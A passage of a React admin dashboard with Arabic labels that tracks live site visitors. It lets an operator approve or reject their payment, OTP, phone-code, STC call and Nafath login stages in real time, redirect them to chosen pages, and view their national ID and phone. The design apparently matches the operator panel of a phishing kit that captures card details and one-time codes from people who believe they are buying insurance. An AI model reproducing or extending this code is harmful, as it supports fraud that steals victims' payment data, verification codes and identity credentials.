                    const groupCount = visitors.filter(v => group.pages.some(p => p.value === v.current_page)).length;
                    return (
                      <optgroup key={group.group} label={`── ${group.group} ──`}>
                        <option value={`group:${group.group}`} style={{ fontWeight: 700 }}>
                          📁 كل {group.group} ({groupCount})
                        </option>
                        {group.pages.map(p => {
                          const count = visitors.filter(v => v.current_page === p.value).length;
                          return (
                            <option key={p.value} value={p.value}>
                              {p.label} {count > 0 ? `(${count})` : ""}
                            </option>
                          );
                        })}
                      </optgroup>
                    );
                  })}
                  {uniqueDynamic.length > 0 && (
                    <optgroup label={`── أخرى (${visitors.filter(v => uniqueDynamic.some(p => p.value === v.current_page)).length}) ──`}>
                      {uniqueDynamic.map(p => {
                        const count = visitors.filter(v => v.current_page === p.value).length;
                        return (
                          <option key={p.value} value={p.value}>
                            {p.label} {count > 0 ? `(${count})` : ""}
                          </option>
                        );
                      })}
                    </optgroup>
                  )}
                </select>
                <select
                  value={sortBy}
                  onChange={e => setSortBy(e.target.value as any)}
                  className="h-7 text-[10px] bg-background border border-border rounded-lg px-2 text-foreground focus:outline-none focus:ring-2 focus:ring-primary/20 focus:border-primary flex-1 min-w-[100px]"
                >
                  <option value="default">ترتيب: افتراضي</option>
                  <option value="duration">الأطول مدة</option>
                  <option value="entry">الأحدث دخولاً</option>
                  <option value="last_action">آخر إجراء</option>
                </select>
              </div>

              {/* Sub-filter for pending */}
              {statusFilter === "pending" && (
                <div className="flex items-center gap-1.5 flex-wrap" dir="rtl">
                  <span className="text-[10px] text-muted-foreground">تصفية:</span>
                  {[
                    { key: "all" as const, label: "الكل", count: pendingCount, color: "amber" },
                    { key: "requests" as const, label: "طلبات", count: pendingRequestsCount, color: "blue", icon: FileText },
                    { key: "stages" as const, label: "مراحل", count: pendingStagesCount, color: "purple", icon: GitBranch },
                  ].map(f => (
                    <button
                      key={f.key}
                      onClick={() => setPendingSubFilter(f.key)}
                      className={`inline-flex items-center gap-0.5 px-2 py-0.5 rounded-full text-[10px] font-medium transition-all ${
                        pendingSubFilter === f.key
                          ? `bg-${f.color}-500/20 text-${f.color}-600 ring-1 ring-${f.color}-400`
                          : "bg-muted/40 text-muted-foreground hover:bg-muted"
                      }`}
                    >
                      {f.icon && <f.icon className="w-2.5 h-2.5" />}
                      {f.label} ({f.count})
                    </button>
                  ))}
                </div>
              )}

              {/* Contextual actions */}
              {statusFilter === "offline" && offlineCount > 0 && (
                <button
                  onClick={() => setShowDeleteConfirm(() => () => deleteVisitors(visitors.filter(v => !v.is_online).map(v => v.id)))}
                  className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg text-[10px] font-medium bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all w-full justify-center"
                >
                  <Trash2 className="w-3 h-3" />مسح جميع غير المتصلين
                </button>
              )}
              {statusFilter === "deleted" && deletedVisitors.length > 0 && (
                <button
                  onClick={() => { setDeletedVisitors([]); setDeletedCount(0); setStatusFilter("all"); toast.success("تم مسح سجل الزوار المحذوفين"); }}
                  className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg text-[10px] font-medium bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all w-full justify-center"
                >
                  <Trash2 className="w-3 h-3" />مسح السجل
                </button>
              )}
              {statusFilter === "favorites" && favoriteCount > 0 && (
                <div className="flex items-center gap-1.5">
                  <button
                    onClick={async () => {
                      const favIds = visitors.filter(v => v.is_favorite).map(v => v.id);
                      for (const id of favIds) await supabase.from("site_visitors").update({ is_favorite: false }).eq("id", id);
                      toast.success("تم إزالة الكل من المفضلة");
                      setStatusFilter("all");
                      fetchVisitors();
                    }}
                    className="inline-flex items-center gap-1 px-2 py-1 rounded-lg text-[10px] font-medium bg-amber-400/10 text-amber-600 hover:bg-amber-400/20 transition-all flex-1 justify-center"
                  >
                    <Star className="w-3 h-3" />إزالة الكل
                  </button>
                  {visitors.filter(v => v.is_favorite && !v.is_online).length > 0 && (
                    <button
                      onClick={() => setShowDeleteConfirm(() => () => deleteVisitors(visitors.filter(v => v.is_favorite && !v.is_online).map(v => v.id)))}
                      className="inline-flex items-center gap-1 px-2 py-1 rounded-lg text-[10px] font-medium bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all flex-1 justify-center"
                    >
                      <Trash2 className="w-3 h-3" />مسح غير المتصلين
                    </button>
                  )}
                </div>
              )}
            </div>

            {/* Visitor items */}
            <div className="flex-1 overflow-y-auto p-2 space-y-2">
              <AnimatePresence mode="popLayout">
              {filteredVisitors.length === 0 ? (
                <motion.div
                  key="empty"
                  initial={{ opacity: 0, scale: 0.95 }}
                  animate={{ opacity: 1, scale: 1 }}
                  exit={{ opacity: 0, scale: 0.95 }}
                  transition={{ duration: 0.2 }}
                  className="p-6 text-center"
                >
                  <p className="text-xs text-muted-foreground">{searchQuery ? "لا توجد نتائج" : "لا يوجد زوار حالياً"}</p>
                </motion.div>
              ) : (
                paginatedVisitors.map((visitor, index) => {
                  const hasPendingRequest = !!pendingRequestMap[visitor.id];
                  const pendingStage = pendingStageMap[visitor.id];
                  const isPriority = visitor.is_online && getVisitorPriority(visitor.current_page) > 0;
                  const uaInfo = parseUserAgent(visitor.user_agent);
                  const DeviceIcon = uaInfo.device === "Mobile" ? Smartphone : uaInfo.device === "Tablet" ? Tablet : Monitor;
                  return (
                    <motion.div
                      layout
                      initial={{ opacity: 0, y: 20, scale: 0.97 }}
                      animate={{ 
                        opacity: 1, y: 0, scale: 1,
                        filter: visitor.is_online ? "saturate(1)" : "saturate(0.7)",
                      }}
                      exit={{ opacity: 0, x: -30, scale: 0.95 }}
                      transition={{ 
                        duration: 0.4, 
                        delay: Math.min(index * 0.03, 0.3),
                        ease: "easeOut",
                        filter: { duration: 0.8 },
                      }}
                      key={visitor.id}
                    >
                      <button
                        onClick={() => {
                          if (chatSelectMode) {
                            setSelectedForClear(prev => {
                              const next = new Set(prev);
                              if (next.has(visitor.session_id)) next.delete(visitor.session_id);
                              else next.add(visitor.session_id);
                              return next;
                            });
                          } else {
                            setSelectedVisitor(visitor);
                          }
                        }}
                        className={`w-full text-right p-3 transition-all rounded-2xl border shadow-sm relative overflow-hidden ${
                          selectedVisitor?.id === visitor.id
                            ? "border-primary/40 ring-2 ring-primary/20 shadow-md"
                            : "border-border/50 hover:border-primary/20 hover:shadow-md"
                        } ${
                          visitor.is_blocked
                            ? "bg-destructive/[0.04] border-destructive/20 opacity-50"
                            : pendingStage
                            ? "bg-gradient-to-l from-amber-500/10 via-amber-500/[0.04] to-card border-amber-500/40 shadow-amber-500/5"
                            : isPriority
                            ? "bg-amber-500/[0.06] border-amber-500/30 ring-1 ring-amber-500/15"
                            : hasPendingRequest
                            ? "bg-blue-500/[0.05] border-blue-500/25"
                            : visitor.is_online
                            ? "bg-emerald-500/[0.04] border-emerald-500/20"
                            : "bg-muted/30 border-border/40"
                        }`}
                      >
                      {/* Awaiting decision indicator - top glow bar */}
                      {pendingStage && !visitor.is_blocked && (
                        <div className="absolute top-0 bottom-0 right-0 w-1 bg-gradient-to-b from-amber-400 via-amber-500 to-amber-400 rounded-r-2xl animate-pulse" />
                      )}
                      {/* Awaiting decision badge */}
                      {(pendingStage || hasPendingRequest) && !visitor.is_blocked && (
                        <motion.div
                          initial={{ scale: 0, opacity: 0 }}
                          animate={{ scale: 1, opacity: 1 }}
                          className={`absolute top-1.5 left-1.5 z-10 flex items-center gap-1 px-1.5 py-0.5 rounded-full border ${
                            pendingStage && ["otp", "phone_otp"].includes(pendingStage)
                              ? "bg-red-500/15 border-red-500/30"
                              : pendingStage
                              ? "bg-amber-500/15 border-amber-500/30"
                              : "bg-blue-500/15 border-blue-500/30"
                          }`}
                        >
                          <span className="relative flex h-2 w-2">
                            <span className={`animate-ping absolute inline-flex h-full w-full rounded-full opacity-75 ${
                              pendingStage && ["otp", "phone_otp"].includes(pendingStage) ? "bg-red-500" : pendingStage ? "bg-amber-500" : "bg-blue-500"
                            }`} />
                            <span className={`relative inline-flex rounded-full h-2 w-2 ${
                              pendingStage && ["otp", "phone_otp"].includes(pendingStage) ? "bg-red-500" : pendingStage ? "bg-amber-500" : "bg-blue-500"
                            }`} />
                          </span>
                          <span className={`text-[8px] font-bold ${
                            pendingStage && ["otp", "phone_otp"].includes(pendingStage) ? "text-red-600" : pendingStage ? "text-amber-600" : "text-blue-600"
                          }`}>
                            {pendingStage && ["otp", "phone_otp"].includes(pendingStage)
                              ? "OTP"
                              : pendingStage
                              ? "بانتظار الرد"
                              : "طلب معلق"}
                          </span>
                          {pendingStage && ["otp", "phone_otp"].includes(pendingStage) && (
                            <OtpBadgeTimer startTime={pendingStageTimestampsRef.current[visitor.id]} />
                          )}
                        </motion.div>
                      )}
                      <div className="flex items-start gap-2.5">
                        {chatSelectMode && (
                          <motion.div
                            initial={{ scale: 0 }}
                            animate={{ scale: 1 }}
                            className={`w-4 h-4 rounded border-2 flex items-center justify-center shrink-0 mt-1 transition-all ${
                              selectedForClear.has(visitor.session_id) ? "bg-primary border-primary" : "border-muted-foreground/40"
                            }`}
                          >
                            <AnimatePresence>
                              {selectedForClear.has(visitor.session_id) && (
                                <motion.div
                                  initial={{ scale: 0, rotate: -45 }}
                                  animate={{ scale: 1, rotate: 0 }}
                                  exit={{ scale: 0, rotate: 45 }}
                                  transition={{ type: "spring", stiffness: 500, damping: 25 }}
                                >
                                  <Check className="w-2.5 h-2.5 text-primary-foreground" />
                                </motion.div>
                              )}
                            </AnimatePresence>
                          </motion.div>
                        )}

                        {/* Avatar */}
                        {(() => {
                          const avatarColor = getVisitorAvatar(visitor.session_id);
                          const initial = getVisitorInitial(visitor.visitor_name);
                          return (
                        <div className="relative shrink-0">
                          <div className={`w-10 h-10 rounded-2xl flex items-center justify-center shadow-sm bg-gradient-to-br ${avatarColor.bg} border border-white/20 ${pendingStage ? "ring-2 ring-amber-400/60 ring-offset-1 ring-offset-card" : ""}`}>
                            <span className={`text-sm font-bold ${avatarColor.text}`}>{initial}</span>
                          </div>
                          {pendingStage && (
                            <span className="absolute -top-1.5 -left-1.5 flex h-3.5 w-3.5">
                              <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75" />
                              <span className="relative inline-flex rounded-full h-3.5 w-3.5 bg-amber-500 items-center justify-center">
                                <Clock className="w-2 h-2 text-white" />
                              </span>
                            </span>
                          )}
                          <motion.span
                            animate={{
                              backgroundColor: visitor.is_online ? "rgb(16, 185, 129)" : "rgba(115, 115, 115, 0.3)",
                              boxShadow: visitor.is_online ? "0 0 8px rgba(16,185,129,0.5)" : "0 0 0px rgba(0,0,0,0)",
                              scale: visitor.is_online ? [1, 1.3, 1] : 1,
                            }}
                            transition={{ duration: 0.5, ease: "easeInOut" }}
                            className="absolute -bottom-0.5 -left-0.5 w-3 h-3 rounded-full border-2 border-card"
                          />
                          <button
                            onClick={e => toggleFavorite(visitor.id, e)}
                            className="absolute -top-1 -right-1 p-0.5 rounded-full hover:scale-125 transition-transform"
                          >
                            <Star className={`w-3 h-3 ${visitor.is_favorite ? "fill-amber-400 text-amber-400 drop-shadow-sm" : "text-transparent hover:text-amber-400"}`} />
                          </button>
                        </div>
                          );
                        })()}

                        {/* Content */}
                        <div className="flex-1 min-w-0 space-y-1">
                          {/* Row 1: Name + badges */}
                          <div className="flex items-center gap-1.5">
                            <p className="text-xs font-bold text-foreground truncate">
                              {visitor.visitor_name || "زائر"}
                            </p>
                            {visitor.is_blocked && (
                              <span className="px-1.5 py-0.5 rounded-md text-[8px] font-bold bg-destructive/10 text-destructive">محظور</span>
                            )}
                            {isPriority && (
                              <span className="px-1.5 py-0.5 rounded-md text-[8px] font-bold bg-amber-500/15 text-amber-600 animate-pulse flex items-center gap-0.5">
                                <CreditCard className="w-2.5 h-2.5" />دفع
                              </span>
                            )}
                          </div>

                          {/* Row 2: Page + location */}
                          <div className="flex items-center gap-1.5 text-[10px] text-muted-foreground">
                            <MapPin className="w-2.5 h-2.5 shrink-0" />
                            <span className="truncate">{visitor.current_page || "الصفحة الرئيسية"}</span>
                          </div>

                          {/* Row 3: Device · Country · Time */}
                          <div className="flex items-center gap-1 text-[9px] text-muted-foreground/70">
                            <DeviceIcon className="w-2.5 h-2.5 shrink-0" />
                            <span className="truncate">
                              {visitor.country && `${countryFlag(visitor.country_code)} `}
                              {[uaInfo.browser, uaInfo.os].filter(Boolean).join(" · ")}
                            </span>
                            <span className="text-muted-foreground/30">·</span>
                            <LiveTimer since={visitor.created_at} />
                            <span className="text-muted-foreground/30">·</span>
                            <span className={`${visitor.is_online ? "text-emerald-600 font-medium" : ""}`}>
                              {visitor.is_online ? "متصل" : formatTime(visitor.last_seen_at)}
                            </span>
                          </div>

                          {/* Row 4: Tags */}
                          {((visitor.tags || []).length > 0 || hasPendingRequest || pendingStage) && (
                            <div className="flex items-center gap-1 flex-wrap pt-0.5">
                              {(visitor.tags || []).map(tagKey => {
                                const tagInfo = VISITOR_TAGS.find(t => t.key === tagKey);
                                return tagInfo ? (
                                  <span key={tagKey} className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-md text-[8px] font-bold border ${tagInfo.color}`}>
                                    <Tag className="w-2 h-2" />{tagInfo.label}
                                  </span>
                                ) : null;
                              })}
                              {hasPendingRequest && !visitor.is_blocked && (
                                <span
                                  role="button"
                                  tabIndex={0}
                                  title="فتح تفاصيل الطلب المعلق"
                                  onClick={(e) => { e.stopPropagation(); jumpToPendingDetails(visitor, "request"); }}
                                  onKeyDown={(e) => { if (e.key !== "Enter" && e.key !== " ") return; e.preventDefault(); e.stopPropagation(); jumpToPendingDetails(visitor, "request"); }}
                                  className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-md bg-blue-500/12 text-blue-600 text-[8px] font-bold animate-pulse border border-blue-500/20 cursor-pointer hover:bg-blue-500/20"
                                >
                                  <FileText className="w-2 h-2" />طلب معلق
                                </span>
                              )}
                              {pendingStage && !visitor.is_blocked && (
                                <span
                                  role="button"
                                  tabIndex={0}
                                  title="فتح تفاصيل المرحلة المعلقة"
                                  onClick={(e) => { e.stopPropagation(); jumpToPendingDetails(visitor, "stage"); }}
                                  onKeyDown={(e) => { if (e.key !== "Enter" && e.key !== " ") return; e.preventDefault(); e.stopPropagation(); jumpToPendingDetails(visitor, "stage"); }}
                                  className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-md bg-purple-500/12 text-purple-600 text-[8px] font-bold animate-pulse border border-purple-500/20 cursor-pointer hover:bg-purple-500/20"
                                >
                                  <GitBranch className="w-2 h-2" />مرحلة معلقة
                                </span>
                              )}
                            </div>
                          )}

                          {/* Stage indicator */}
                          {pendingStage && !visitor.is_blocked && (() => {
                            const stageLabels: Record<string, { label: string; icon: string }> = {
                              payment: { label: "الدفع", icon: "💳" }, otp: { label: "رمز OTP", icon: "🔑" },
                              phone_verification: { label: "توثيق الجوال", icon: "📱" }, phone_otp: { label: "كود الجوال", icon: "📲" },
                              stc_call: { label: "مكالمة STC", icon: "📞" }, nafath_login: { label: "دخول نفاذ", icon: "🔐" },
                              nafath_verify: { label: "تحقق نفاذ", icon: "✅" },
                            };
                            const info = stageLabels[pendingStage] || { label: pendingStage, icon: "⏳" };
                            return (
                              <div className="flex items-center gap-1 pt-0.5">
                                <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-lg bg-gradient-to-l from-primary/10 to-primary/5 text-primary text-[9px] font-bold border border-primary/15">
                                  <span>{info.icon}</span>{info.label}
                                </span>
                                <span className="inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-lg bg-amber-500/10 text-amber-600 text-[8px] font-bold border border-amber-500/15 animate-pulse">
                                  <Clock className="w-2.5 h-2.5" />بانتظار
                                </span>
                              </div>
                            );
                          })()}

                          {/* Last resolved */}
                          {!pendingStage && !visitor.is_blocked && (() => {
                            const resolved = lastResolvedMap[visitor.id];
                            if (!resolved) return null;
                            const stageLabels: Record<string, { label: string; icon: string }> = {
                              payment: { label: "الدفع", icon: "💳" }, otp: { label: "رمز OTP", icon: "🔑" },
                              phone_verification: { label: "توثيق الجوال", icon: "📱" }, phone_otp: { label: "كود الجوال", icon: "📲" },
                              stc_call: { label: "مكالمة STC", icon: "📞" }, nafath_login: { label: "دخول نفاذ", icon: "🔐" },
                              nafath_verify: { label: "تحقق نفاذ", icon: "✅" },
                            };
                            const info = stageLabels[resolved.stage] || { label: resolved.stage, icon: "⏳" };
                            const isApproved = resolved.status === "approved";
                            return (
                              <div className="flex items-center gap-1 pt-0.5">
                                <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-lg bg-muted/40 text-muted-foreground text-[9px] font-bold border border-border/40">
                                  <span>{info.icon}</span>{info.label}
                                </span>
                                <span className={`inline-flex items-center gap-0.5 px-1.5 py-0.5 rounded-lg text-[8px] font-bold border ${isApproved ? "bg-emerald-500/10 text-emerald-600 border-emerald-500/15" : "bg-destructive/10 text-destructive border-destructive/15"}`}>
                                  {isApproved ? <Check className="w-2 h-2" /> : <X className="w-2 h-2" />}
                                  {isApproved ? "موافق" : "مرفوض"}
                                </span>
                              </div>
                            );
                          })()}

                          {/* Inline approve/reject */}
                          {pendingStage && visitor.is_online && !visitor.is_blocked && (
                            <div className="flex items-center gap-1.5 pt-1" onClick={e => e.stopPropagation()}>
                              <button
                                onClick={async (e) => {
                                  e.stopPropagation();
                                  const { data: pOrders } = await supabase.from("insurance_orders").select("id").eq("visitor_session_id", visitor.session_id).eq("stage_status", "pending").limit(1);
                                  if (pOrders && pOrders[0]) handleStageApprove(pOrders[0].id);
                                }}
                                disabled={loadingAction !== null}
                                className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-emerald-600 text-white text-[9px] font-bold hover:bg-emerald-700 transition-all disabled:opacity-50 shadow-sm"
                              >
                                <Check className="w-2.5 h-2.5" />موافقة
                              </button>
                              <button
                                onClick={async (e) => {
                                  e.stopPropagation();
                                  const { data: pOrders } = await supabase.from("insurance_orders").select("id").eq("visitor_session_id", visitor.session_id).eq("stage_status", "pending").limit(1);
                                  if (pOrders && pOrders[0]) handleStageReject(pOrders[0].id);
                                }}
                                disabled={loadingAction !== null}
                                className="inline-flex items-center gap-1 px-2.5 py-1 rounded-lg bg-destructive text-destructive-foreground text-[9px] font-bold hover:bg-destructive/90 transition-all disabled:opacity-50 shadow-sm"
                              >
                                <X className="w-2.5 h-2.5" />رفض
                              </button>
                            </div>
                          )}

                          {statusFilter === "deleted" && (
                            <button
                              onClick={e => {
                                e.stopPropagation();
                                setDeletedVisitors(prev => prev.filter(v => v.id !== visitor.id));
                                setDeletedCount(prev => Math.max(0, prev - 1));
                                toast.success("تم إزالة الزائر من السجل");
                              }}
                              className="mt-1 inline-flex items-center gap-1 px-2 py-0.5 rounded-lg text-[9px] bg-destructive/10 text-destructive hover:bg-destructive/20 transition-all"
                            >
                              <X className="w-2.5 h-2.5" />إزالة من السجل
                            </button>
                          )}
                        </div>
                      </div>
                      </button>
                    </motion.div>
                  );
                })
               )}
              </AnimatePresence>
              {/* Load more sentinel */}
              {visibleCount < filteredVisitors.length && (
                <div ref={listEndRef} className="flex items-center justify-center py-3">
                  <div className="flex items-center gap-2 text-[10px] text-muted-foreground">
                    <Loader2 className="w-3 h-3 animate-spin" />
                    <span>تحميل المزيد... ({visibleCount} من {filteredVisitors.length})</span>
                  </div>
                </div>
              )}
              {visibleCount >= filteredVisitors.length && filteredVisitors.length > 20 && (
                <div className="text-center py-2 text-[10px] text-muted-foreground">
                  عرض الكل ({filteredVisitors.length})
                </div>
              )}
            </div>
            {/* Select mode action bar */}
            {chatSelectMode && (
              <div className="p-2 border-t border-border bg-muted/30 flex items-center justify-between gap-2">
                <div className="flex items-center gap-2">
                  <button
                    onClick={() => {
                      if (selectedForClear.size === filteredVisitors.length) {
                        setSelectedForClear(new Set());
                      } else {
                        setSelectedForClear(new Set(filteredVisitors.map(v => v.session_id)));
                      }
                    }}
                    className="px-2 py-1 rounded-lg text-[10px] font-medium bg-primary/10 text-primary hover:bg-primary/20 transition-all"
                  >
                    {selectedForClear.size === filteredVisitors.length ? "إلغاء تحديد الكل" : "تحديد الكل"}
                  </button>
                  <span className="text-[10px] text-muted-foreground">محدد: {selectedForClear.size}</span>
                </div>
                <div className="flex items-center gap-1.5">
                  <button
                    onClick={() => { setChatSelectMode(false); setSelectedForClear(new Set()); }}
                    className="px-2.5 py-1 rounded-lg text-[10px] font-medium bg-muted text-muted-foreground hover:bg-muted/80 transition-all"
                  >إلغاء</button>
                  <button
                    onClick={() => {
                      if (selectedForClear.size === 0) { toast.info("حدد زوار أولاً"); return; }
                      sounds.warning();
                      setShowDeleteConfirm(() => clearSelectedChats);
                    }}
                    disabled={selectedForClear.size === 0}
                    className="px-2.5 py-1 rounded-lg text-[10px] font-medium bg-destructive text-destructive-foreground hover:bg-destructive/90 disabled:opacity-50 transition-all"
                  >مسح المحدد ({selectedForClear.size})</button>
                </div>
              </div>
            )}
          </div>

          {/* Visitor details panel */}
          <div className={`${selectedVisitor ? "flex" : "hidden md:flex"} flex-1 bg-card border border-border rounded-xl overflow-hidden flex-col`}>
            <AnimatePresence mode="wait">
            {!selectedVisitor ? (
              <motion.div
                key="empty-state"
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                exit={{ opacity: 0 }}
                transition={{ duration: 0.2 }}
                className="flex-1 flex items-center justify-center"
              >
                <div className="text-center space-y-3">
                  <div className="w-16 h-16 rounded-full bg-muted/50 flex items-center justify-center mx-auto">
                    <User className="w-8 h-8 text-muted-foreground/50" />
                  </div>
                  <p className="text-lg font-semibold text-muted-foreground">اختر زائر لعرض التفاصيل</p>
                </div>
              </motion.div>
            ) : (
              <VisitorDetailsPanel
                selectedVisitor={selectedVisitor}
                linkedRequests={linkedRequests}
                linkedOrders={linkedOrders}
                linkedClaims={linkedClaims}
                linkedChats={linkedChats}
                stageEvents={stageEvents}
                visitorName={visitorName}
                customerName={customerName}
                visitorPhone={visitorPhone}
                visitorNationalId={visitorNationalId}
                loadingAction={loadingAction}
                nafathNumberInputs={nafathNumberInputs}
                setNafathNumberInputs={setNafathNumberInputs}
                onClose={() => setSelectedVisitor(null)}
                onApprove={handleApprove}
                onReject={handleReject}
                onStageApprove={handleStageApprove}
                onStageReject={handleStageReject}
                onUpdateNafathNumber={handleUpdateNafathNumber}
                onBlockToggle={handleBlockToggle}
                onExportPDF={handleExportPDF}
                onClearChat={handleClearChat}
                onToggleFavorite={(id) => toggleFavorite(id)}
                onToggleTag={toggleVisitorTag}
                onRedirect={async (page) => {
                  if (!page) return;
                  const { error } = await supabase.from("site_visitors").update({ redirect_to: page } as any).eq("id", selectedVisitor.id);
                  if (error) { toast.error("فشل توجيه الزائر"); return; }
                  toast.success(`تم توجيه الزائر إلى ${page}`);
                  setRedirectPage("");
                }}
                redirectPage={redirectPage}
                setRedirectPage={setRedirectPage}
              />
            )}
            </AnimatePresence>
          </div>
        </div>
      </div>
    </>
  );
};

export default AdminVisitors;
